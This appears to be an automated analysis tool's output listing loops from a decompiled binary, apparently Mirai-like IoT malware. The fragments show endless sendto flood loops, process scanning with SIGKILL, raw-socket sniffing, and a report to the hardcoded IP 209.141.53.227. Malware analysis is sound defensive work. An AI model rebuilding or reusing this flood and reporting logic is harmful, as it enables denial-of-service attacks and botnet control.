		int32_t v267 = recvfrom(sock_fd, &buf, 256, MSG_NOSIGNAL, (struct sockaddr *)&addr2, &addr_len); // 0xca84
		close(fd);
		close(fd);
		int32_t sock_fd3 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc91c
		fd = sock_fd3;
		if (sock_fd3 == -1) {
		sock_fd2 = sock_fd3;
=============================WHILE LOOPS ID : 36 @ function_c6b8 ====================================
++++++++ WHILE START : 20870 
++++++++ WHILE FUNCTION : function_c6b8 
++++++++ WHILE END : 20941 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
=============================WHILE LOOPS ID : 39 @ function_cf34 ====================================
++++++++ WHILE START : 21319 
++++++++ WHILE FUNCTION : function_cf34 
++++++++ WHILE END : 21504 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		while (true) {
=============================WHILE LOOPS ID : 41 @ function_d6a8 ====================================
++++++++ WHILE START : 21834 
++++++++ WHILE FUNCTION : function_d6a8 
++++++++ WHILE END : 22016 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		sendto(fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
=============================WHILE LOOPS ID : 44 @ function_df00 ====================================
++++++++ WHILE START : 22961 
++++++++ WHILE FUNCTION : function_df00 
++++++++ WHILE END : 23466 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		close(fd2);
		dirp = opendir((char *)name);
		while (true) {
		while (true) {
		struct __dirstream * dirp2 = opendir((char *)&path); // 0xe2b4
		while (true) {
		while (true) {
		kill(function_13118((char *)v280, 10), SIGKILL);
		struct dirent * v298 = readdir((struct __dirstream *)dirp3); // 0xe3b0
		struct dirent * v299 = readdir((struct __dirstream *)dirp3); // 0xe2c4
		closedir((struct __dirstream *)dirp3);
		v289 = readdir((struct __dirstream *)fd2);
		closedir((struct __dirstream *)dirp4);
		closedir((struct __dirstream *)dirp3);
		v289 = readdir((struct __dirstream *)fd2);
		struct dirent * v309 = readdir((struct __dirstream *)fd2); // 0xe1d0
		closedir((struct __dirstream *)fd2);
		closedir((struct __dirstream *)fd2);
		close(fd2);
		dirp = opendir((char *)name);
		while (true) {
		closedir((struct __dirstream *)fd2);
=============================WHILE LOOPS ID : 46 @ function_e49c ====================================
++++++++ WHILE START : 23794 
++++++++ WHILE FUNCTION : function_e49c 
++++++++ WHILE END : 24252 
++++++++ INTRESTING INSTRUCTIONS :  
		struct __dirstream * v242 = opendir((char *)function_1293c(13, NULL)); // 0xe60c
		int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe70c
		sock2 = sock_fd;
		if (sock_fd != -1) {
		int32_t sock; // bp-60
		bind((int32_t)&sock, (struct sockaddr *)16, 16);
		listen(sock2, 1);
		int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe754
		int32_t sock4 = sock_fd2; // r4
		if (sock_fd2 != -1) {
		int32_t sock3; // bp-76
		bind((int32_t)&sock3, (struct sockaddr *)16, 16);
		listen(sock4, 1);
		int32_t sock_fd3 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe78c
		sock4 = sock_fd3;
		if (sock_fd3 != -1) {
		int32_t sock5; // bp-124
		bind((int32_t)&sock5, (struct sockaddr *)16, 16);
		listen(sock4, 1);
		int32_t sock_fd4 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe7c4
		sock4 = sock_fd4;
		if (sock_fd4 != -1) {
		int32_t sock6; // bp-140
		bind((int32_t)&sock6, (struct sockaddr *)16, 16);
		listen(sock4, 1);
		int32_t sock_fd5 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe7fc
		sock4 = sock_fd5;
		if (sock_fd5 != -1) {
		int32_t sock7; // bp-92
		bind((int32_t)&sock7, (struct sockaddr *)16, 16);
		listen(sock4, 1);
		int32_t sock_fd6 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xe834
		sock2 = sock_fd6;
		if (sock_fd6 != -1) {
		int32_t sock8; // bp-108
		bind((int32_t)&sock8, (struct sockaddr *)16, 16);
		listen(sock2, 1);
		struct dirent * v244 = readdir((struct __dirstream *)dirp); // 0xe86455
		while (true) {
		while (true) {
		sock2 = v263;
		int32_t fd2 = open((char *)&path2, O_RDONLY); // 0xeab4
		while (true) {
		while (true) {
		close(fd4);
		kill(time_val, SIGKILL);
		v251 = readdir((struct __dirstream *)dirp);
		while (true) {
		close(fd4);
		close(fd4);
		if (function_13340((char *)&path, sock2 - 1, v285) != -1) {
		kill(time_val, SIGKILL);
		int32_t pid2 = getpid(); // 0xea4c
		int32_t ppid = getppid(); // 0xea58
		int32_t fd3 = open((char *)&path, O_RDONLY); // 0xea90
		sock2 = fd3;
		kill(time_val, SIGKILL);
		fd5 = sock2;
		close(fd5);
		v251 = readdir((struct __dirstream *)dirp);
		v251 = readdir((struct __dirstream *)dirp);
		struct dirent * v288 = readdir((struct __dirstream *)dirp); // 0xe8e4
		v251 = readdir((struct __dirstream *)dirp2);
		v251 = readdir((struct __dirstream *)dirp2);
		v251 = readdir((struct __dirstream *)dirp);
		closedir((struct __dirstream *)dirp);
		closedir((struct __dirstream *)dirp);
=============================WHILE LOOPS ID : 48 @ function_eddc ====================================
++++++++ WHILE START : 25358 
++++++++ WHILE FUNCTION : function_eddc 
++++++++ WHILE END : 25618 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		int32_t sock;
		if (sock == -1) {
		int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0xf2e8
		int32_t fd3 = sock_fd; // r5
		if (sock_fd != -1) {
		fcntl(sock_fd, F_GETFL);
		connect(sock, (struct sockaddr *)&addr, 16);
		uint32_t v271 = sock; // 0xf1c0
		int32_t v275 = sock; // 0xf0ec
		send(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		uint32_t sock2 = sock; // 0xf1ec
		if (sock2 != -1) {
		if ((v283 >> sock2 % 32) % 2 != 0) {
		int32_t v284 = recv(sock, (int32_t *)&buf2, 2, MSG_PEEK | MSG_NOSIGNAL); // 0xf24c
		__pseudo_cond_branch(sock != -1, (int32_t)&v282);
		sock = -1;
		recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		close(sock);
		int32_t v288 = recv(sock, &buf3, length, MSG_PEEK | MSG_NOSIGNAL); // 0xf2a4
		recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		recv(sock, &buf3, length2, MSG_NOSIGNAL);
		if ((v293 >> sock2 % 32) % 2 == 0) {
		__pseudo_cond_branch(sock2 != -1, (int32_t)&v282);
		getsockopt(sock2, SO_DEBUG, 4, &option_value, &option_len);
		send(sock, &buf4, 4, MSG_NOSIGNAL);
		send(sock, (int32_t *)&buf2, 1, MSG_NOSIGNAL);
		send(sock, &buf5, length3, MSG_NOSIGNAL);
		close(sock);
=============================WHILE LOOPS ID : 51 @ function_f9e4 ====================================
++++++++ WHILE START : 27527 
++++++++ WHILE FUNCTION : function_f9e4 
++++++++ WHILE END : 29688 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xfb2c
		sock = sock_fd;
		fcntl(sock_fd, F_GETFL);
		fcntl(sock_fd, F_SETFL);
		if (setsockopt(sock, level, 3, &option_value, 4) != 0) {
		close(sock);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		uint32_t v248 = recvfrom(sock, &buf, 1514, MSG_NOSIGNAL, (struct sockaddr *)addr, (int32_t *)addr); // 0x11888
		while (true) {
		sock_fd2 = v222 + 288 * v254;
		close(fd);
		char * v263 = (char *)(sock_fd2 + 284); // 0x11b40
		while (true) {
		int32_t sock18; // 0x11c10
		if (sock18 != -1) {
		if ((v274 >> sock18 % 32) % 2 == 0) {
		v272 = sock18;
		while (true) {
		while (true) {
		sock_fd2 = buf2;
		int32_t sock2; // 0x11dd8
		int32_t v284 = recv(sock2, (int32_t *)buf2, 256 - v283, MSG_NOSIGNAL); // 0x11de8
		close(fd2);
		while (true) {
		case 2: {
		sock_fd2 = v320;
		while (true) {
		while (true) {
		sock_fd2 = v337;
		int32_t v344 = sock_fd2; // 0x12574
		int32_t sock3; // 0x12658
		send(sock3, &buf3, 3, MSG_NOSIGNAL);
		v354 = (char *)sock_fd2;
		v357 = (char *)(sock_fd2 + 1);
		send(0x4000, (int32_t *)buf4, 3, MSG_NOSIGNAL);
		v348 = sock_fd2 + 3;
		sock_fd2 = v348;
		v357 = (char *)(sock_fd2 + 1);
		v354 = (char *)sock_fd2;
		send(0x4000, (int32_t *)(int32_t)&buf5, 9, MSG_NOSIGNAL);
		v348 = sock_fd2 + 3;
		sock_fd2 = v348;
		while (true) {
		case 2: {
		sock_fd2 = v320;
		while (true) {
		case 3: {
		int32_t sock4; // 0x11fc8
		send(sock4, (int32_t *)buf6, (int32_t)length, MSG_NOSIGNAL);
		int32_t sock5; // 0x11fe0
		send(sock5, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		while (true) {
		case 4: {
		int32_t sock6; // 0x12074
		send(sock6, (int32_t *)buf7, (int32_t)length2, MSG_NOSIGNAL);
		int32_t sock7; // 0x1208c
		send(sock7, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		while (true) {
		case 5: {
		while (true) {
		int32_t sock8; // 0x12140
		send(sock8, (int32_t *)buf8, (int32_t)length3, MSG_NOSIGNAL);
		int32_t sock9; // 0x12154
		send(sock9, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 6: {
		while (true) {
		int32_t sock10; // 0x12208
		send(sock10, (int32_t *)buf9, length4, MSG_NOSIGNAL);
		int32_t sock11; // 0x1221c
		send(sock11, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 7: {
		while (true) {
		int32_t sock12; // 0x12398
		send(sock12, (int32_t *)buf10, length4, MSG_NOSIGNAL);
		int32_t sock13; // 0x123ac
		send(sock13, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 8: {
		while (true) {
		int32_t sock14; // 0x122d0
		send(sock14, (int32_t *)buf11, (int32_t)length3, MSG_NOSIGNAL);
		int32_t sock15; // 0x122e4
		send(sock15, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 9: {
		while (true) {
		int32_t sock16; // 0x12504
		send(sock16, (int32_t *)buf12, (int32_t)length3, MSG_NOSIGNAL);
		int32_t sock17; // 0x12518
		send(sock17, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 10: {
		int32_t v444 = fork(); // 0x12758
		sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		inet_addr("209.141.53.227");
		if (connect(sock_fd2, (struct sockaddr *)&addr2, 16) == -1) {
		close(sock_fd2);
		send(sock_fd2, (int32_t *)&length3, 1, MSG_NOSIGNAL);
		send(sock_fd2, &length4, 4, MSG_NOSIGNAL);
		send(sock_fd2, &buf13, length5, MSG_NOSIGNAL);
		send(sock_fd2, (int32_t *)(v319 + 12), 1, MSG_NOSIGNAL);
		send(sock_fd2, (int32_t *)buf14, (int32_t)length6, MSG_NOSIGNAL);
		send(sock_fd2, (int32_t *)(v319 + 13), 1, MSG_NOSIGNAL);
		send(sock_fd2, (int32_t *)buf15, (int32_t)length7, MSG_NOSIGNAL);
		close(sock_fd2);
		close(fd3);
		close(fd4);
		while (true) {
		case 3: {
		case 4: {
		case 5: {
		case 6: {
		case 7: {
		case 8: {
		case 9: {
		case 10: {
		close(fd2);
		while (true) {
		char * v452 = (char *)(sock_fd2 + v451); // 0x11dfc
		if ((length4 || getsockopt(sock18, SO_DEBUG, 4, &length4, (int32_t *)&length3)) == 0) {
		while (true) {
		close(fd5);
		while (true) {
=============================WHILE LOOPS ID : 86 @ __udivsi3 ====================================
++++++++ WHILE START : 39218 
++++++++ WHILE FUNCTION : __udivsi3 
++++++++ WHILE END : 39430 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 87 @ __umodsi3 ====================================
++++++++ WHILE START : 39949 
++++++++ WHILE FUNCTION : __umodsi3 
++++++++ WHILE END : 40303 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 88 @ __modsi3 ====================================
++++++++ WHILE START : 40621 
++++++++ WHILE FUNCTION : __modsi3 
++++++++ WHILE END : 41001 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
